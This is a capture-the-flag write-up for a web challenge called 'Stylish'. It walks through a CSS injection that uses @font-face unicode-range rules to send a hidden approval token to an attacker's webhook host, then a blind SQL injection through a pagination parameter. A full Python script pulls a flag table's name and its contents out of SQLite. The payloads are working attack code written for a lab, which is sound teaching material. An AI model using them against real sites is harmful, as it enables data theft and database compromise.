# Stylish

The challenge starts by allowing the user to write css code to modify the style of a generic user card.
The web application requires that you provide at least one css rule and, after you sent it, it provides you a text message telling you that it actually succseeded and that an "admin" is going to check its validity.
If you try to look at your card by clicking at the link provided, it does not allow you, saying that the card still needs to be approved!

Upon reading the source code, from the Dockerfile it can be immediately seen that it is using **Puppeteer**.
Moreover, we can see the bot.js file that in fact uses puppeteer to create a bot that will visit a provided url.
For the above reason, the first step should probably be a **Cross Site Scripting attack via CSS Injection**.
While still looking at the source code, a very important line can be found inside the file index.js:

```javascript
app.use(function(req, res, next) {
	res.setHeader("Content-Security-Policy", "default-src 'self'; object-src 'none'; img-src 'self'; style-src 'self'; font-src 'self' *;")
    next();
});
```

The fact that it has **font-src 'self' \*** will allow cross site scripting when looking for fonts. This can be done with the @font-face rule.

Now that we know the vulnerability, we should think about what we can do with it. We can see from the file routes->injex.js that there is a very convenient endpoint that accepts GET requests at **/approve/:id/:approvalToken**.
Let's look at what the approvalToken is then. 
In helpers->TokenHelper.js we see this:

```javascript
module.exports = {
	generateToken() {
		const dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		const shuffle = v=>[...v].sort(_=>Math.random()-.5).join('');

		// Shuffle characters and sort them in ASCII order
		return shuffle(dict).substring(0, 32).split('').sort().join('');
	}
}
```
This function is called to randomly generate the approvalToken. It's important to notice that, because of the way in which it is generated, the token will not have duplicates!
Finally, the token is stored inside of none other that the page that the bot will be visiting after the submission of the css code!
In fact, upon sending the css code, a new css file called #submissionId.css will be created and the bot will be created to visit the page at views->card_unapproved.html, and by using nunjucks the content of **{{ variableName }}** will be substituded with variableName's actual value dinamically.

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <title>View Card</title>
        <link href="/assets/css/bootstrap.min.css" rel="stylesheet" />
        <link href="/assets/css/main.css" rel="stylesheet" />
        <link href="{{ cssFile }}" rel="stylesheet" />
    </head>
    <body>
        <main role="main" class="container">
            <div class="jumbotron">
                <div class="row text-center">
                    <div class="col d-flex justify-content-center">
                        <div class="card">
                            <img class="card-img-top mx-auto img-fluid" src="/assets/img/avatar.png" alt="Card image">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item flex-fill">Name: John</li>
                                <li class="list-group-item flex-fill">Surname: Doe</li>
                                <li class="list-group-item flex-fill">Age: 35</li>
                            </ul>
                            <div class="card-body">
                                <p class="card-text">...</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row text-center mt-5">
                    <div class="col">
                        <div class="form-group">
                            <p id="approvalToken" class="d-none">{{ approvalToken }}</p>
                            <p id="rejectToken" class="d-none">{{ rejectToken }}</p>
                            <a id="approveBtn" data-id="{{ submissionID }}" class="btn btn-primary" role="button">Approve submission</a>
                            <a id="rejectBtn" data-id="{{ submissionID }}" class="btn btn-danger" role="button">Reject submission</a>
                            <div id="responseMsg"></div>                                                
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <script type="text/javascript" src="/assets/js/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="/assets/js/admin.js"></script>
    </body>
</html>
```
As shown in the code, the cssFile will be changed each time we send a new css code. Moreover, within the page we can see that there is the approvalToken! 
The idea is to try to get informations about the approvalToken by injecting malicious CSS code.
As it is clearly shown in Masato Kinugawa's blog (https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), there is in fact the possibility to exfiltrate the content of a web page using the @font-face rule and by abusing the Unicode Range, thus allowing us to read the approvalToken.
The general idea is that we can force the bot to send GET requests to download a specific font style file from a link that we provide upon finding a specific character defined by the unicode range value!
Knowing this, we can create a large list of @font-face rules, one for each character in the list *abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789*, and send requests to our own webhook server, sending as a GET parameter the character that we just found!
It is important to notice that, by simply trying the attack provided at the above link, it will not work. The reason why that happens is because, within the assets->css->bootstrap.css file there is a troublesome rule:

```css
d-none{display:none!important}
```
Since the token will not be displayed, the attack will not work. For this reason, we should overwrite the **display: none !important** rule ourselves. The CSS code should be like the following:

```css
@font-face{
	font-family:attack;
	src:url(http://webhook_attack_server.pwn/?Found:0);
	unicode-range:U+0030;
}
...
@font-face{
	font-family:attack;
	src:url(http://webhook_attack_server.pwn/?Found:z);
	unicode-range:U+007A;
}
p#approvalToken{
 display:inline !important;
 font-family:attack;
}
```
For the full code look at the /attack.css file in the repository.

Note that the requests will be sent in a random order, but by looking again at the way in which the token is generated, we can see that it is sorted, for this reason we just simply need to sort the 32 exfiltrated characters and we got ourselves the token!
The next step should be to use the same trick as before to trigger the approval of our post. For simplicity, let's assume that in the token the first character is **0**, we can just simply use that:

```css
@font-face{
	font-family:attack;
	src:url(/approve/1/23568BDGHIJLPQTUVXZabcdfknrstwxz);
	unicode-range:U+0032;
}
p#approvalToken{
 display:inline !important;
 font-family:attack;
}
```

Now, upon entering /view/1 we will be able to see another section of the web application.
Here we can add comments to the card. Let's look at the code, more precisely at the database code:

```javascript
async migrate() {
        const flagTable = 'flag_' + crypto.randomBytes(4).toString('hex');

        return this.db.exec(`
            PRAGMA case_sensitive_like=ON; 
            
            DROP TABLE IF EXISTS submissions;
            CREATE TABLE IF NOT EXISTS submissions (
                id          INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                css         TEXT NOT NULL,
                approved    BOOLEAN NOT NULL 
            );

            DROP TABLE IF EXISTS comments;
            CREATE TABLE IF NOT EXISTS comments (
                id               INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                id_submission    INTEGER NOT NULL,
                content          TEXT NOT NULL
            );

            DROP TABLE IF EXISTS ${flagTable};
            CREATE TABLE IF NOT EXISTS ${flagTable} (
                flag          VARCHAR(255) NOT NULL
            );
            
            INSERT INTO ${flagTable} VALUES ('HTB{f4k3_fl4g_f0r_t3st1ng}');
        `);
    }
```

First of all we see that the flag is inside of a table of which name is randomly generated.
Second of all, let's look at the way in which the operations to the database are made, regarding the comments section:

```javascript
async insertComment(submissionID, commentContent) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('INSERT INTO comments (id_submission, content) VALUES (?, ?)');
                resolve((await stmt.run(submissionID, commentContent).then((result) => { return result.lastID; })));
			} catch(e) {
				reject(e);
			}
		});
	}

	async getSubmissionComments(submissionID, pagination=10) {
		return new Promise(async (resolve, reject) => {
			try {
                const stmt = `SELECT content FROM comments WHERE id_submission = ${submissionID} LIMIT ${pagination}`;
                resolve(await this.db.all(stmt));
			} catch(e) {
				reject(e);
			}
		});
	}
```

The insertion is safe, but the retreival of commemts is not! The retreival of comments is triggered when changing the value of the pagination, in the drop down menu.
By using burpsuite it is possible to easily look at how the data will be sent to the web server:

```http
POST /api/comment/entries HTTP/1.1
Host: 94.237.59.24:41458
Content-Length: 37
Accept-Language: it-IT,it;q=0.9
Content-Type: application/json
Accept: */*
Origin: http://94.237.59.24:41458
Referer: http://94.237.59.24:41458/view/1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"submissionID":11,"pagination":"30"}
```

Unfortunately, the submissionID is an integer, but the pagination is a string, thus allowing us to try some sql injections. Note that sqlite is being used.
We are able to introduce our payload only after the LIMIT, thus not allowing us to use UNION.
By trying to send **"(select 15)"** as pagination using burpsuite, we can see that it actually works.
Sending **"(select unicode('a'))"** works again.
The idea is then to push many comments in the database, then, using the special sqlite table **sqlite_master**, find the name of the table containing the flag, character per character.
If we take each character and provide to the LIMIT function the unicode value of said character, we can count the number of data received to obtain that specific unicode value, thus obtaining the character.

Once we get the name of the table, we can use the same trick once again to obtain the characters of the flag itself.

This can be easily done with a python script:

```python
import requests 

basename = "http://94.237.59.24:41458/api/comment/submit"

#preparing comment list
for i in range(0,256):
	response = requests.post(basename, json={"submissionID":11,"commentContent":"get_pwned"})
	
#exfiltrating the table's name, flag_XXXXXXXX
basename = "http://94.237.59.24:41458/api/comment/entries"
base = 6
table_name = "flag_"
for i in range(0,8):
	params = {"submissionID":11,"pagination":"(select unicode(substr(tbl_name," + str(base + i) + ",1)) from sqlite_master WHERE tbl_name LIKE 'flag%' LIMIT 1)"}
	response = requests.post(basename, json=params)
	table_name = table_name + chr(response.text.count("content"))
	
print(table_name)

#Exfiltrating the flag using the same trick as before!
flag = ""
for i in range(0,255):
	params = {"submissionID":11,"pagination":"(select unicode(substr(flag," + str(i) + ",1)) from " + table_name + " WHERE flag LIKE 'H%' LIMIT 1)"}
	response = requests.post(basename, json=params)
	flag = flag + chr(response.text.count("content"))
	print("*** Character exfiltrated: " + chr(response.text.count("content")))
	if chr(response.text.count("content")) == "}":
		break
	
print(flag)
```
